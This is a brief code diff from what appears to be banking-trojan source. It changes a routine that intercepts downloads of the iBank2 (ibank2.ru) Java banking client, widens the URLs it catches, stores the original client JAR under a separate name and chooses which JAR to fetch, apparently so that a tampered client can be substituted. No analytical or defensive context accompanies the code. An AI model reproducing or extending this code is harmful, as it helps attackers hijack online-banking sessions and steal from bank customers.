@@ -104,7 +104,7 @@ void CheckJavaClient2015File(const char *aURL)
 
 
 	if (!WildCmp((PCHAR)aURL, "*/client_ver.js") &&
-		!WildCmp((PCHAR)aURL, "*://ibank2.ru/ibank2client.jar"))
+		!WildCmp((PCHAR)aURL, "*://ibank2.ru/*"))
 		return;
 
 
@@ -125,8 +125,13 @@ void CheckJavaClient2015File(const char *aURL)
 	string FileName = Path + "_client2015_orig.jar";
 
 
+	if (FileExistsA(FileName.t_str()))
+		return;
+
 	TURL URL(aURL);
-	if (URL.Host.Hash() != 0xDF8E3E03 /* ibank2.ru */)
+	if (URL.Host.Hash() == 0xDF8E3E03 /* ibank2.ru */)
+		URL.Document = "ibank2client.jar";
+	else
 		URL.Document =  "client2015.jar";
 
 	TJavaClientFileData *Data = new TJavaClientFileData();
